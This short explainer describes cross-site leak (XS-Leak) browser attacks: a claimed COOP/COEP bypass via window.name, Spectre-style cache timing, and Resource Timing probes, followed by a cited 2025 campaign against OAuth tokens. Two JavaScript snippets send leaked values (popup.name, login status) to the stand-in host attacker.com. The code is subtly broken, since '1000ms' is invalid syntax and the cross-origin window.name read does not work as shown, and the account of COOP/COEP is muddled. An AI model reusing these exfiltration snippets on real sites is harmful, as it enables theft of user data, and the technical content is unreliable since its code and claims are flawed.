**XS-Leak (Cross-Site Leak)** techniques exploit **browser side-channel vulnerabilities** to extract **sensitive data** across origins.

**1. COOP/COEP Bypasses:**
- **Cross-Origin Opener Policy (COOP)** and **Cross-Origin Embedder Policy (COEP)** were designed to prevent **window.opener exploits**.
- **Bypass via `window.name`:**
  - Attacker sets `window.name` in a **cross-origin popup**:
    ```javascript
    const popup = window.open("https://victim.com/login", "popup");
    setInterval(() => {
      if (popup.closed) {
        fetch(`https://attacker.com/leak?data=${popup.name}`);
      }
    }, 1000);
    ```
  - **Victim site leaks `window.name` (e.g., CSRF tokens) upon navigation.**

**2. Speculative Execution Leaks (Spectre-like):**
- **Attack via `performance.now()`:**
  - Attacker loads a **malicious script** via `<script src="https://victim.com/data">`.
  - **Exploits CPU cache timing** to infer **sensitive data** (e.g., **credit card numbers**).
- **Mitigation:** **Chrome Site Isolation** (SitePerProcess) limits cross-site JS execution.

**3. Timing Attacks (Resource Timing API):**
- **Leak via `performance.getEntries()`:**
  ```javascript
  fetch("https://victim.com/api/user");
  const entries = performance.getEntries();
  if (entries[0].duration > 1000ms) {
    fetch("https://attacker.com/?slow=true"); // User is authenticated
  }
  ```
  - **Attackers measure request timing** to infer **authentication status**.

**Real-World Example:** **2025’s "XS-Leak 2.0" campaign** abused **COOP bypasses** in **Chrome 120** to **steal OAuth tokens** from **Google Workspace**.

